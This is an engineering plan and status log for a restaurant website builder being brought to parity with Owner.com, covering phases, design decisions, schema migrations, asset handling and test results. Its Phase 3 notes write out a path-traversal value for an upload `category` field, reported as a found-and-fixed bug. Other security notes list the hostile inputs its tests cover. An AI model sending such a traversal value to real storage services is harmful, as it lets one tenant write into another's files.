# Plan — Owner.com Website parity, from the live teardown

**Date:** 2026-08-18
**Branch:** `feat/website-owner-ui`
**Source of truth for the target:** [`docs/research/owner-com-website-tab/`](../../research/owner-com-website-tab/) —
a 2026-08-18 read-only capture of a live Owner.com merchant account (28 screenshots, 15 feature docs).
**Supersedes:** [PLAN-2026-08-18-OWNER-FULL-FEATURE-PARITY.md](PLAN-2026-08-18-OWNER-FULL-FEATURE-PARITY.md),
which was written from the older static `owner.com/` screenshot folder and is stale in three places (§4 lists
public rendering as unbuilt; it predates the capability-flag and character-cap findings; it plans Announcements,
which we are now skipping).

---

## 0. Status

| Phase | State |
|---|---|
| 0 — Close the two live holes (nav, masthead move) | ✅ **Built 2026-08-19**, unit-tested, not yet QA'd on a real merchant |
| 1 — Capability flags and Owner's caps | ✅ **Built 2026-08-19**, unit-tested |
| 2 — Reshape `content` (schema v2) | ✅ **Built 2026-08-19**, unit-tested |
| 3 — Assets and the real logo | 🟡 **Code-complete 2026-08-19** — migration applied to staging, NOT to production |
| 4 — Complete the catalogue | 🟡 **8 of 9 kinds built** — Reservations is the only remaining kind |
| 5 — Brand toggles + site settings | 🟡 **Built 2026-08-20**, unit-tested — migration NOT applied anywhere |
| 6 — Tracking | 🟡 **Built 2026-08-20**, unit-tested — migration NOT applied anywhere |
| 7 — Forms | 🟡 **Built 2026-08-20**, unit-tested — migration NOT applied anywhere |
| 8 — Events | 🟡 **Built 2026-08-20**, unit-tested — migration NOT applied anywhere |
| 9 — Careers | ⬜ next |
| 10–12 | ⬜ |

> ### ✅ Browser-verified 2026-08-19, against Joes Coffee Shop on staging
>
> The migration is applied (`logo_asset_id` confirmed present). Verified live in the editor: the nav editor opens
> from the header block and persists append-only (checked against the stored jsonb, not just the UI); the
> character counters render for the first time ever; capability flags omit the right controls per kind — the hero
> and footer have **no move buttons**; and the v1 → v2 content migration has run on this merchant's real page,
> with `<p>Tell your story here.</p>` now reading as the plain subtitle `Tell your story here.` (21/500).
>
> **The original bug is confirmed and fixed on this merchant.** Their nav held `Home` and `Career` while the
> published `About us` was unreachable — exactly as the audit described. Adding it through the new editor wrote
> `[Home, Career, About us]`, in that order.
>
> **Not yet exercised in a browser:** photo upload, the Add Section catalogue's five new kinds, and the public
> page render. The MCP browser session dropped before those.

> ### 🔴 Phase 3 is not usable until its migration runs
>
> ~~`supabase/migrations/20260819120000_website_assets.sql` has not been applied anywhere.~~ **Applied to staging
> 2026-08-19** and confirmed by querying `merchant_sites.logo_asset_id`. Production still needs it.
>
> Until it runs, uploading a photo fails at the insert, and `get_public_site_page` returns a row without
> `site_logo_url`, which reads as `null` and falls back to the storefront logo. Nothing breaks; nothing works.
>
> **Correction (2026-08-19):** the edge function does *not* need redeploying for uploads to work.
> `MerchantAssetCategory` is a TypeScript type and Deno erases types; nothing validated `category` at runtime, so
> the deployed function already accepts `"website"`. The migration alone unblocks the feature.
>
> Redeploying is still worth doing, because checking that turned up a **pre-existing path-traversal bug**: with no
> runtime check, `category` was interpolated straight into the storage path, so an authenticated merchant admin
> could send `category: "../../organizations/<someone>/logos"` and write outside their own directory
> (`sanitizeFileName` guards `fileName`, not `category`). The delete path had the same hole — its
> `startsWith("merchants/{id}/")` check passes before traversal resolves. Both are fixed in
> `supabase/functions/cdn-upload/index.ts` with a runtime category allowlist and a traversal guard, and **that fix
> is only live once the function is deployed.**

No SQL migration was needed for any of it — the document migration is a read-time function, per the rule in
`migrations/index.ts`. Two behaviour changes a merchant could notice without asking for them: the tightened
character caps, and the loss of rich-text formatting inside content blocks.

> ### ⚠️ Deployment order for phase 2
>
> `CURRENT_SCHEMA_VERSION` is now **2**, and migrations only run forwards. A v1 build reading a v2 document does
> not fail loudly and does not drop the section — **it replaces every content block's copy with the v1
> placeholder text**. Verified, not assumed: v1's `contentSchema` requires `body` and `imagePosition`, neither of
> which a v2 document has, so the parse fails, `pickValidFields` salvages nothing (v2's field names are not in
> the v1 shape), and the section resolves to `{ heading: "About us", body: "<p>Tell your story here.</p>" }`.
>
> The page still renders. It renders looking as though the merchant never wrote anything.
>
> **Deploy readers before writers, and do not roll back a deployed instance past this commit** while any v2
> document exists. Published versions are immutable snapshots migrated on read like everything else, so this
> would hit live public pages, not just drafts.

---

## 1. Why this plan replaces the previous one

The earlier parity plan inferred Owner's product from screenshots. This one is written against a teardown of the
running application, which surfaced five mechanisms that no screenshot shows and that turn out to be the whole
reason Owner's builder produces good sites from untrained merchants:

1. **Per-section capability flags** — `editable` / `deletable` / `movable` differ per kind, and are enforced by
   *omitting the control*, never by disabling it or erroring after the click.
2. **Hard character caps with live counters** — 50 for a title, 500 for a subtitle, 150 for a hero. Not warnings.
3. **`Add Section` dividers between every pair of sections** — which is why nobody misses drag-and-drop.
4. **Brand-level feature toggles gating section availability** — brand settings decide *whether* a capability
   exists; the page editor decides only *where and what it says*.
5. **No autosave; explicit per-page Publish** — in-memory draft, `Done` commits to the draft, `Publish` goes live,
   and closing dirty raises *Discard unsaved changes*.

Owner's own positioning is the frame for all of it:

> *"if you're looking for a lot of design freedom, Owner is not the right fit"*

**The simplicity is removed decisions, not a visual style.** Any work item below that adds a knob "because it is
easy" is moving away from the thing being copied.

---

## 2. Decisions ratified for this plan

Agreed 2026-08-18 with the team lead. These are load-bearing; changing one changes the phase plan.

| # | Decision | Consequence |
|---|---|---|
| **W1** | **Scope is core + every Website child except Announcements.** Pages, Style, editor, nav, assets, section catalogue, plus Events, Forms, Tracking (pixels), Customer support, Careers. | Announcements is not built. Owner is retiring it; a Scrolling Banner section plus proper holiday-hours handling covers the real need. |
| **W2** | **Adopt Owner's constraints, keep our safety net.** Capability flags, hard caps, omitted controls, restaurant-shaped catalogue — all adopted. Autosave stays **only because explicit publish stays**. Delete-undo stays. | `Hide from the page` and `Duplicate` are **removed** from the gutter menu — Owner has neither and both are decisions the merchant should not be asked to make. |
| **W3** | **Reshape `content` to Owner's field set,** with a real document migration. | `CURRENT_SCHEMA_VERSION` goes to 2; a `1 → 2` migration converts TipTap `body` HTML to a plain 500-char `subtitle`. This is the only breaking change in the plan. |
| **W4** | **Popular Items keeps its editor** (a deliberate divergence). | Owner's Popular Items has no editor at all and renders whatever the menu says. Ours lets the merchant choose *which* items via `MenuItemPicker`, which is strictly better and already built. The teardown's point — never make a merchant maintain the same fact twice — is honoured: name, price, photo and 86-state still resolve live. |
| **W5** | **Custom domains stay a request flow.** | Owner, whose entire pitch is restaurant websites, has no self-serve domain UI anywhere. Subdomains are the launch boundary; DNS/verification/TLS is not in this plan. |
| **W6** | **Name it `Tracking`, not `Analytics`.** | It shows no data. Owner's naming here is the one clear misstep in the teardown, and it buys a support ticket every time a merchant clicks it expecting visitor numbers. |

---

## 3. Verified current state

Read off the code on `feat/website-owner-ui`, not off the plans. Where this disagrees with
[GAPS-2026-08-16](GAPS-2026-08-16-WEBSITE-FEATURE-AUDIT.md), that document is stale — it predates the
`20260816140000_website_public_addressing.sql` and `20260816150000_website_public_page_merchant.sql` migrations.

| Owner mechanism | Our state | Evidence |
|---|---|---|
| Pages list: search-in-header, Created by, status pill, pagination | ✅ built (no `Created by` column) | [`PagesScreen.tsx`](../../../components/site-builder/dashboard/PagesScreen.tsx) |
| Shared editor chrome — Close / name / Build·Preview / Publish | ✅ built, reused four ways | [`EditorTopBar.tsx`](../../../components/site-builder/builder/EditorTopBar.tsx), [`OverlayChrome.tsx`](../../../components/site-builder/shell/OverlayChrome.tsx) |
| Gutter controls + full-width Add Section bands | ✅ built | [`Canvas.tsx`](../../../components/site-builder/builder/Canvas.tsx) |
| Three templates — Article / Showcase / Blank, previewed in brand style | ✅ built | [`page-templates.ts`](../../../lib/site-builder/page-templates.ts), [`NewPageOverlay.tsx`](../../../components/site-builder/dashboard/NewPageOverlay.tsx) |
| Five style knobs + live preview + hex input | ✅ built | [`StyleOverlay.tsx`](../../../components/site-builder/dashboard/StyleOverlay.tsx), [`style-inputs.ts`](../../../lib/site-builder/style-inputs.ts) |
| Live character counters | ✅ built, derived from schema `.max()` | [`SectionDrawer.tsx:121`](../../../components/site-builder/builder/SectionDrawer.tsx#L121) |
| Public route serving a published page | ✅ built | [`resolve-render-mode.ts`](../../../lib/site-builder/resolve-render-mode.ts), [`built-site.tsx`](../../../app/sites/[slug]/built-site.tsx), `get_public_site_page` |
| Draft persistence, optimistic concurrency, publish/unpublish | ✅ built | [`draft.ts`](../../../app/dashboard/website/actions/draft.ts), [`publish.ts`](../../../app/dashboard/website/actions/publish.ts) |
| **Caps at Owner's numbers** | ❌ ours are 160 / 2 000 / 20 000 | [`primitives.ts:72-78`](../../../lib/site-builder/sections/primitives.ts#L72-L78) |
| **`editable` / `movable` capability flags** | ❌ registry has `deletable` and zones only | [`registry.ts`](../../../lib/site-builder/sections/registry.ts) |
| **Hero cannot be moved above the header** | 🔴 **it can.** `moveSection` forbids only *cross-zone* moves, and header + hero share `masthead` | [`mutations.ts:194-203`](../../../lib/site-builder/mutations.ts#L194-L203) |
| **Navigation editor** | 🔴 **nothing writes `merchant_sites.nav`.** [`nav.ts`](../../../lib/site-builder/nav.ts) is a complete writer with no caller; `buildPublicRenderContext` reads the column. A merchant can publish a page no visitor can reach. | grep: only `StyleOverlay` calls `UpdateSiteSettings`, and only with `theme` |
| Logo replace | 🔴 stub — the panel says logos come from Online Store branding | [`StyleOverlay.tsx:137-160`](../../../components/site-builder/dashboard/StyleOverlay.tsx#L137-L160) |
| Asset library | ❌ none. `resolveAssetUrl` returns `null` for every id, which is why Gallery carries `unavailable` | [`render-context.ts:199`](../../../lib/site-builder/render-context.ts#L199) |
| Section catalogue | 9 kinds of the 18 we need | [`kinds.ts`](../../../lib/site-builder/sections/kinds.ts) |
| Brand feature toggles | ❌ none | — |
| Events · Forms · Tracking · Customer support · Careers | ❌ none of the five exist | — |

**Two live defects fell out of this table** and were the reason Phase 0 existed: a publishable page could be
unreachable (nav), and a merchant could put their hero above their navigation (zone rule). Both are closed;
neither has been QA'd against a real merchant yet.

---

## 4. Scope boundary

### In

Pages · Style · page editor · navigation · assets · the section catalogue · Events · Forms · Tracking ·
Customer support · Careers, each with a working public consumer.

### Out, and why

| Not building | Reason |
|---|---|
| **Announcements** | Owner shipped it, ran it, and is retiring it (creation *removed*, not disabled). Decision **W1**. |
| **Custom domains** | Decision **W5**. Owner has no self-serve domain UI at all. Subdomains are the launch boundary. |
| **Device / viewport switcher** | Owner's dashboard editor has none; layouts are responsive by construction. Already removed in our rebuild. |
| **Drag-and-drop for sections** | Buttons plus insertion dividers, deliberately. Drag survives in exactly one place: the nav link list. |
| **A second ordering or reservation system** | Website is the marketing layer. `Order online` links into the existing per-location storefront; Reservations writes to the existing `reservations` table. |
| **Rebuilding Reports as "Analytics"** | Four pixel-id fields, nothing more. Decision **W6**. |

### Things Owner does not do that we should, because they are cheap

Recorded here so they are chosen rather than drifted into: **per-page SEO** (title/description/OG), **image alt
text**, and **`used on N pages` rollups** for forms. Each is a differentiator and each costs under a day inside a
phase it already touches. Everything else on the teardown's "absences" list (duplication, version history,
scheduled publishing, draft share links) stays out of scope.

---

## 5. The section catalogue target

Owner's Add Section dialog offers **13**. Five more of their blocks exist on pages but are never in the catalogue
(nav, hero, footer are structural; FAQ and Our location are managed elsewhere). Our target is **18 kinds**.

| Kind | Status | Editable | Deletable | Movable | Content source |
|---|---|:---:|:---:|:---:|---|
| `header` | ✅ built | ✅ | ❌ | ❌ | own editor, **site-wide** |
| `hero` | ✅ built | ✅ | ❌ | ❌ | own editor |
| `content` | ✅ built, **reshaping** (W3) | ✅ | ✅ | ✅ | own editor |
| `gallery` | ✅ built, disabled on assets | ✅ | ✅ | ✅ | own editor |
| `features` | ✅ built | ✅ | ✅ | ✅ | own editor |
| `popular-items` | ✅ built | ✅ (W4) | ✅ | ✅ | **menu**, live |
| `faq` | ✅ built (ours; Owner's is reorder-only) | ✅ | ✅ | ✅ | own editor |
| `location` | ✅ built | ✅ | ✅ | ✅ | **location settings**, live |
| `footer` | ✅ built | ❌ | ❌ | ❌ | site config |
| `cards` | ➕ new | ✅ | ✅ | ✅ | own editor |
| `form` | ➕ new | ✅ | ✅ | ✅ | **`site_forms`** record |
| `pdf` | ➕ new | ✅ | ✅ | ✅ | asset |
| `video` | ➕ new | ✅ | ✅ | ✅ | allowlisted provider id or asset |
| `scrolling-banner` | ➕ new | ✅ | ✅ | ✅ | own editor |
| `reviews` | ➕ new | ✅ | ✅ | ✅ | own editor, **gated by brand toggle** |
| `reservations` | ➕ new | ✅ | ✅ | ✅ | existing `reservations` table |
| `events` | ➕ new | ❌ | ✅ | ✅ | **`site_events`**, live |
| `integrations` | ➕ new | ✅ | ✅ | ✅ | allowlisted third parties only |

**`reviews` is the cheap win the teardown unlocked.** We cut it in v1 for want of a data source; the capture shows
Owner's is **manually curated** — the merchant types the quote and the attribution — which removes the blocker
entirely. It is a repeater of quote + name, gated by a brand toggle.

**`integrations` is the one to keep on a short leash.** Owner's is a third-party embed slot. Ours is an allowlist
of named providers with typed configuration. There is no arbitrary-HTML section in this product and there never
will be — the same rule that keeps `content` behind `sanitizeHtml`.

---

## 6. Data model additions

Migrations in dependency order, split by domain. Every table carries `merchant_id` (trigger-derived from the
parent, never client-set), `site_id` where site-owned, timestamps, indexes and RLS.

| Migration | Tables / columns |
|---|---|
| `..._website_assets` | `site_assets` (storage path, cdn url, mime, bytes, w/h, **alt_text**, uploaded_by, quota against `merchant_sites.max_asset_bytes`); `merchant_sites.logo_asset_id`, `favicon_asset_id`, `og_image_asset_id` |
| `..._website_brand_features` | `merchant_sites.features` jsonb — `{ reviews, rewards, giftCards, reservations }`, Zod-validated, versioned |
| `..._website_forms` | `site_forms` (template key, ordered field definitions with stable ids, recipients, confirmation copy, active); `site_form_submissions` (sanitized payload, source page, ip hash, spam score, delivery state, read_at) |
| `..._website_events` | `site_events` (slug, name, description, photo asset, start/end, timezone, recurrence, location_id, ticket url, status) |
| `..._website_careers` | `site_jobs` (role, `is_visible`, compensation mode + min/max, location_id, display order); `site_job_applications` (name, email, phone, **private** resume storage path, status, retention metadata) |
| `..._customer_order_support` | `customer_order_support_requests` (order_id, customer_id, issue type enum, comment, status, response, resolver) |

`merchant_sites.integrations` already exists and is where the four tracking ids go — a versioned Zod shape, not
four columns.

**Four rules that apply to all of it:**

- **Feature records live outside `PageDocument`.** A section stores a reference; the public renderer resolves the
  current record at request time. Cancelling an event must not require republishing every page that lists it.
- **Assets are referenced by id, never by URL.** `site_assets` owns the current URL. This is what makes a CDN move
  a config change rather than a rewrite of every merchant's JSONB.
- **Store first, notify second.** A failed Resend call must never lose a catering lead or a job application.
- **Resumes are private.** Separate bucket or path, randomized names, PDF/DOCX only, short-lived signed URLs issued
  by an authorized action, and a written retention answer before launch.

---

## 7. Phases

Work items are checkboxes. Mark them here as they land; do not open a new dated file.

### Phase 0 — Close the two live holes · 3–4 d — ✅ **BUILT 2026-08-19**

Nothing else ships on top of a builder that can publish an unreachable page.

- [x] **Navigation editor**, reached from the header section's ✏️, per the teardown's
      [§4 of 06-section-types](../../research/owner-com-website-tab/features/06-section-types.md).
      Banner: *"Changes to the navigation affect all pages."* Ordered list with **drag handles** — the one place
      drag survives. Row = label + type sub-label, `⋯` → Edit / Delete. Two add buttons: **⊕ Page** (internal) and
      **⊕ Link** (external). `Transparent navigation` toggle.
- [x] Wire it to `UpdateSiteSettings(clerkOrgId, siteId, { nav })` using the existing
      [`nav.ts`](../../../lib/site-builder/nav.ts) serializers, which are already written and tested.
- [x] **Seed on publish, then let the merchant own it.** A newly published page appends itself to `nav`; the
      merchant may reorder or remove it. This is the hybrid the teardown recommends: derivation removes the
      unreachability class of bug, explicit ordering keeps external links and control.
- [x] Header renders overflow into a **More** menu automatically. No breakpoint configuration, no per-link
      hide toggles.
- [x] Backfill: for every existing site whose `nav.items` is empty, derive from published pages on next load.
- [x] **Fix the masthead move.** `moveSection` must also refuse a move that reorders sections *within* the
      masthead. Cover it with a test that tries to put `hero` at index 0.

**Landed.** `NavEditor.tsx` (new) · `nav.ts` (+`appendNavItem`, `removeNavItemByPath`, `deriveNavFromPages`,
`isSameNavTarget`) · `site.ts` (+`UpdateSiteNav`, `EnsureNavSeeded`) · `publish.ts` (`syncNavForPage` on publish,
republish and unpublish) · `pages.ts` (`patchSiteNav` on rename and delete) · `HeaderSection.tsx` (overflow menu,
and a mobile nav that did not previously exist) · `mutations.ts` + registry (`movable`).

Two things found while building it, beyond the planned scope:

1. **The header hid the navigation entirely below `md`.** With an empty nav that was invisible; with a populated
   one it would have meant every phone visitor — most of them — seeing no links at all. The header now collapses
   the whole nav into one `<details>` menu on small screens.
2. **Rename and delete leave dead links too.** The plan only covered publish and unpublish. A page whose address
   changes takes its nav link with it; an archived page loses its link.

**Verification.** 35 new unit tests (`nav-sync.test.ts`, `capabilities.test.ts`, `copy-caps.test.ts`); full
site-builder suite 416/416; `tsc` clean over the touched surface; eslint clean.

**Still needs a human.** Publish a second page on a real merchant, open the public site, confirm the link is
there and works; then reorder and confirm nothing republishes. `npx tsx scripts/verify-site-tenancy.ts` has not
been re-run.

---

### Phase 1 — Capability flags and Owner's caps · 3–4 d — ✅ **BUILT 2026-08-19**

The single most copyable idea in the teardown.

- [x] Add `editable`, `movable` to `SectionDefinition` alongside the existing `deletable`. Fill in all 9 current
      kinds per the table in §5.
- [x] Add `requiresFeature?: 'reviews' | 'rewards' | 'giftCards' | 'reservations'` — the *availability* axis,
      orthogonal to the existing `unavailable?: string` (dependency missing) and consumed in Phase 5.
      *(Landed with Phase 5, which is the phase that consumes it.)*
- [x] `Canvas` **omits** controls a kind does not have. Never render a disabled Edit; never render a Delete that
      toasts a refusal. The merchant must not discover the limit by hitting a wall.
- [x] Enforce the same flags in `mutations.ts`, so the server refuses what the UI does not offer. The UI omitting
      a control is the *affordance*; the mutation refusing is the *invariant*.
- [x] **Remove `Hide from the page` and `Duplicate`** from the gutter `⋯` menu, and the `toggleHidden` /
      `duplicateSection` store actions with them (decision W2). Keep `hidden` in the schema — stored documents may
      already carry it and the renderer must keep honouring it.
- [x] Retighten caps to Owner's numbers: **title 50, subtitle 500, hero title 150**. Counters already read
      `.max()` off the schema, so this is a `primitives.ts` change plus a normalization pass that truncates rather
      than rejects on read.
- [x] Repair path for over-length stored values: `normalizePage` truncates at the cap and records a repair, so an
      existing long headline degrades instead of 500-ing the editor.

**Landed.** `registry.ts` (three flags on all 9 kinds) · `mutations.ts` (`not_movable`, `not_editable`) ·
`Canvas.tsx` (controls omitted per kind; overflow menu gone) · `store.ts` (`toggleHidden`, `duplicateSection`
removed) · `primitives.ts` (`TITLE_MAX` 50 / `SUBTITLE_MAX` 500 / `HERO_TITLE_MAX` 150) ·
`schema-introspect.ts` · `normalize.ts` (`clampStrings`) · `SectionDrawer.tsx`.

**The counter was inert, and that was not in the plan.** `describeField` set `max` from a hardcoded list of
multiline field names rather than from the schema, so `countableMax` — which asks for a real limit — was handed
`undefined` on every field of every section. The character counter had been written, styled and shipped, and
had never rendered once. `max` now comes off the Zod `max_length` check, `multiline` carries the textarea
decision separately, and the input enforces the cap with `maxLength` so a merchant cannot paste past it and
watch the canvas silently stop updating.

**Two deliberate deviations from §5 of this plan**, both recorded rather than quietly taken:

- **`footer` stays `editable: true`.** Owner's footer is fully locked because every word in it comes from brand
  settings. Ours has no such source yet — the tagline, links and copyright line in `footerSchema` have nowhere
  else to live — so locking it now would strand them. Flips to `false` in Phase 5.
- **`location` stays editable, deletable and movable.** Owner's is a locked block; ours is an addable section
  with its own heading, and its live data already comes from the location record.

**Verification.** `capabilities.test.ts` asserts all three flags on every kind, that the hero cannot move above
the header, that the footer cannot move or be deleted, and that a non-editable kind refuses props edits.
`copy-caps.test.ts` asserts the cap values, that the introspector surfaces them, and that over-long stored copy
is **truncated rather than replaced by a default**.

**Still needs a human**, and it is the one risk worth a look before this reaches merchants: nobody has counted
how many stored headings exceed 50 characters. The repair keeps the first 50 and reports it, so nothing is
destroyed, but a merchant with a 120-character headline will see it cut. Run a count against staging before
enabling for a real cohort.

---

### Phase 2 — Reshape `content` · 3–5 d — ✅ **BUILT 2026-08-19**

Decision **W3**. Nine of Owner's eighteen Home blocks are Content sections; get this one right and most of the
feature works.

- [x] New `contentSchema`: `background` (`none | photo | color`) · `media` (`none | photo | video`) ·
      `alignment` (`left | right`, only when media ≠ none) · `title` (≤50) · `subtitle` (≤500) · `button`
      (`{ label, target }`).
- [x] Background and media are **two independent slots** — Owner's block 6 on Home uses both. Model as two fields,
      not one.
- [x] `Link To` keeps our typed `linkTargetSchema` (`page | url | action`), which is already the analogue of
      Owner's URL / Page / Action picker and already resolves dangling references through binding-health.
- [x] Bump `CURRENT_SCHEMA_VERSION` to **2**; add `MIGRATIONS[1] = v1ToV2` converting `body` HTML → plain text
      `subtitle` (strip tags, collapse whitespace, truncate at 500) and `imagePosition` → `media` + `alignment`.
- [x] Test the migration against a **captured real document**, per the rule in
      [`migrations/index.ts`](../../../lib/site-builder/migrations/index.ts).
- [x] **Deploy readers before writers.** Every running instance must understand v2 before any instance writes one.

**Accepted loss, stated plainly:** merchants lose rich-text formatting inside content blocks. That is the trade
the decision buys — it is also why no Owner site has a headline that wraps to four ugly lines.

**Landed.** `schemas/content.ts` (rewritten) · `migrations/index.ts` (`v1ToV2`, `htmlToPlainText`) ·
`page-document.ts` (version 2) · `ContentSection.tsx` (rewritten) · `page-templates.ts`, `starter-page.ts`,
`fixtures/demo-page.ts` (new shape) · `registry.ts` (`hiddenFields`) · `SectionDrawer.tsx`.

The shape shipped as `background` (none/color/photo) + `backgroundTone` + `backgroundImage` · `media`
(none/photo) + `mediaImage` · `alignment` · `title` · `subtitle` · `button`.

**Three judgement calls worth knowing about:**

- **`media` ships without `video`.** Owner offers None/Photo/Video; we have no video source until the `video`
  section kind in Phase 4, and an option that renders nothing is exactly what the registry's `unavailable` flag
  exists to prevent. Adding an enum value later needs no migration, so waiting costs nothing.
- **Background colours are the three existing tones**, not a picker. Each is derived from the merchant's single
  brand colour with a foreground guaranteed to clear AA — the same reasoning as the five style knobs.
- **`hiddenFields` is new on the registry.** Owner's panel shows the photo picker only once Background is
  Photo, and Alignment only once there is media. A Zod schema cannot express "irrelevant right now", so it is
  declared per kind and the drawer filters on it. Hidden, not disabled — same principle as the gutter controls.

**A security dividend, not a goal.** Content was one of the two places merchant-authored markup reached a public
page. It is now two text nodes, so `dangerouslySetInnerHTML` is gone from the section entirely and the FAQ
answer is the last remaining rich text on a built page. `render.test.tsx` asserts both: the FAQ is still
sanitized, and markup typed into a subtitle is escaped rather than filtered.

**Verification.** `migration-v1-v2.test.ts` — 20 tests against a document of the **real stored v1 shape**,
covering every field mapping, the `imagePosition: "above"` collapse, the never-throws contract, entity decoding,
idempotency, and the migrate-then-truncate path a 900-character body actually takes. Full suite 447/447; build
clean; `tsc` and eslint clean over the touched surface.

**Still needs a human.** Nobody has looked at a migrated page in a browser. The highest-value check is a real
merchant's home page before and after: the words should be identical, the formatting gone, and any block that
had `imagePosition: "above"` now side-by-side.

---

### Phase 3 — Assets and the real logo · 7–10 d — 🟡 **CODE-COMPLETE 2026-08-19, migration not applied**

Blocking Gallery, the hero carousel, Events, Careers and Style.

- [x] `site_assets` + quota accounting + RLS.
- [x] Upload/list/delete actions adapted from [`lib/cdn/server.ts`](../../../lib/cdn/server.ts) and
      `use-merchant-cdn-image-upload.ts`.
- [x] Asset picker + upload field, used by Style, Hero, Content, Gallery, PDF, Events and Careers. Owner's
      **`Select Image` alongside upload** implies a library; build the library.
- [x] Resolve asset ids in `buildRenderContext` **and** `buildPublicRenderContext`; delete the `() => null` stub.
- [x] `SiteImage` becomes the only public section image renderer — dimensions, responsive `srcset`, and **alt
      text**, which Owner does not surface anywhere despite shipping an Accessibility Statement link.
- [x] Remove Gallery's `unavailable` reason.
- [x] **Make Replace Logo real**, storing a merchant-level website logo instead of borrowing one location's
      storefront branding.
- [x] Hero carousel: max 5 photos, upload tile labelled with its own count (`Upload a photo 3/5`) — the affordance
      carries the limit, not help text.
- [x] Orphan-safe deletion: a referenced asset renders a neutral fallback; physical deletion waits for a sweep.

**Security.** Validate MIME from file bytes, reject or sanitize SVG, cap at 5 MB, never allow a user-controlled
storage path.

**Landed.** `20260819120000_website_assets.sql` (new) · `lib/site-builder/assets.ts` (the gate) ·
`asset-map.ts` (loaders + resolver) · `actions/assets.ts` (upload/list/alt/delete) ·
`AssetPicker.tsx` (picker, library dialog, `AssetListPicker`) · `bindings/collect.ts` (`collectAssetIds`) ·
`render-context.ts` (`resolveAsset` replaces `resolveAssetUrl`) · `SiteImage.tsx` · `SectionDrawer.tsx` ·
`StyleOverlay.tsx` · `resolve-render-mode.ts` · `public-context.ts` · `site-context.ts` ·
`cdn-upload/index.ts` (new `website` category).

**Decisions worth knowing about:**

- **SVG is rejected outright**, and deliberately more strictly than the CDN function's own allowlist. An SVG is a
  document — it can carry `<script>`, external references and event handlers — and it would be served from our own
  CDN hostname. A crisper logo is not worth a stored-XSS surface on a public restaurant page. The edge function
  still permits SVG for the organisation logos it accepted before this existed; the *website* path does not.
- **The declared type is treated as a claim, not a fact.** `checkAssetUpload` requires the declared MIME type and
  the file's magic bytes to agree, so a real GIF cannot be uploaded under an `image/png` label to slip past a
  filter keyed on the declaration.
- **Deletion is soft.** A published page holds an immutable snapshot referencing an asset id; hard-deleting would
  leave a live public page with a broken image and no way to repair it short of republishing. `deleted_at` takes
  it out of the picker and out of public resolution, so `SiteImage` resolves null and renders *no element* — the
  page loses a photograph instead of gaining a broken one.
- **`resolveAssetUrl` became `resolveAsset`,** returning dimensions and the library's alt text as well as the URL.
  Without dimensions every merchant photograph causes layout shift, which is a Core Web Vitals number on a product
  sold partly on search ranking. `readImageSize` parses PNG/GIF/JPEG/WebP headers; anything else stores null and
  simply renders without the attributes.
- **Alt text lives on the asset**, with `AssetRef.alt` as a per-placement override. It is a fact about the
  photograph, not about where it sits — and asking a merchant to describe the same dish three times is how you get
  three empty alt attributes. Owner surfaces alt text nowhere at all, while shipping an "Accessibility Statement"
  link in its own footer.
- **One query per render, never one per image.** Ids are collected off the document up front and fetched as a
  single `= ANY(...)`; the public path goes through a SECURITY DEFINER function scoped to one merchant *and* to an
  explicit id list, so a page referencing one photograph cannot enumerate the library.

**Verification.** `assets.test.ts` — 25 tests over the gate (including a script-wearing-a-PNG-name case, an SVG
case, and path traversal in a filename), the header parsers, the id collector and the resolver. Full suite
472/472; build clean; `tsc` and eslint clean over the touched surface.

**Still needs a human, and this one is blocking:** the migration must be applied and the `cdn-upload` edge
function redeployed. After that, the end-to-end check nobody has run is upload → pick → publish → see the photo
on the public page, then delete the asset and confirm the live page loses the image rather than showing a broken
one.

---

### Phase 4 — Complete the catalogue · 8–12 d — 🟡 **8 of 9 built**

**Built:** `cards` · `reviews` · `scrolling-banner` · `video` · `pdf` · `form` · `events` · `integrations`. The
first five are pure content; Forms and Events resolve live records; Integrations is a closed iframe allowlist.

**Not built, each waiting on a system rather than on effort:**

| Kind | Waiting on |
|---|---|
| `reservations` | a public write path into the existing `reservations` table, with its conflict rules |

**`reviews` is the win the teardown paid for.** It was cut from v1 on the assumption that reviews meant a live
Google feed — an integration, a rate limit, a terms-of-service question. The capture showed Owner's is
**manually curated**: a repeater of a quote and a name. That removed the blocker entirely, and it is honest,
because a curated wall of praise is what every restaurant website has always had.

**Two things the tests caught before they shipped**, both mine: `video`'s defaults did not satisfy its own schema
(`videoId` was `.min(1)` while the default was empty), and `scrolling-banner` stored bare strings, which
`describeField` classifies as `unsupported` — the drawer would have rendered no control at all for the one field
that matters. Items are now `{ text }` objects, reusing the repeater that `features` and `faq` already use.

**Security notes.** Video and Integrations are the only sections where merchant-typed text can influence a URL
the browser loads:
input is parsed once in `parseVideoRef`, and what is stored is a **provider and an id**, never a URL and never
markup. `videoEmbedUrl` builds the embed from that pair, so it can only ever point at `youtube-nocookie.com` or
`player.vimeo.com`. There is no "paste your embed code" field in this product and there should not be one. The
scrolling banner defines its animation inside `prefers-reduced-motion: no-preference`, so a visitor who has asked
their device for less movement gets a static row by default rather than after someone remembers to check.

**Integrations follow-up landed 2026-08-20.** The initial allowlist is deliberately only Google Maps and Spotify:
both publish iframe contracts that can be reduced to typed provider data. The schema requires the selected
provider to match the pasted URL; the resolver accepts HTTPS, exact hosts and known paths, drops Spotify tracking
queries, and reconstructs the final iframe URL. Lookalike hosts, credentials, copied `<iframe>` markup and
`javascript:` URLs cannot parse. Providers such as Tock that require copied JavaScript remain excluded; a
restaurant can use its ordinary external reservation link until the first-party Reservations section lands.
`integrations.test.ts` covers provider mismatch and the URL boundary.

Like the marketing pixels, these third-party frames load without a consent gate. That is acceptable only inside
the plan's current US launch boundary; EU/UK rollout needs the same prior-consent work already recorded in Phase 6.

**Verification.** `new-sections.test.ts` — 18 tests covering registration, the video parser (including an
`<iframe>` paste, a `javascript:` URL and a lookalike host), the banner's shape, and the review rating bounds.
Full suite 490/490; build clean; `tsc` and eslint clean.

---

### Phase 4 — original scope · 8–12 d

Nine new kinds (§5). Each is: a Zod schema + defaults, a `SectionPropsMap` entry, a registry entry, a server
renderer, a `registry.tsx` mapping, binding types where it references a record, and validation/render/a11y tests.

- [x] `cards` · `scrolling-banner` (reduced-motion fallback) · `video` (allowlisted YouTube/Vimeo ids or a managed
      asset — never arbitrary iframe HTML) · `pdf` (accessible label, open/download)
- [x] `reviews` — repeater of quote + attribution, `requiresFeature: 'reviews'`
- [ ] `reservations` — writes through the existing `reservations` table and its conflict rules
- [x] `integrations` — allowlist of named providers with typed config
- [x] `form` and `events` land with their product phases (7 and 8) and bind to those records
- [ ] Add each to the Article/Showcase templates **only** when it has meaningful default content

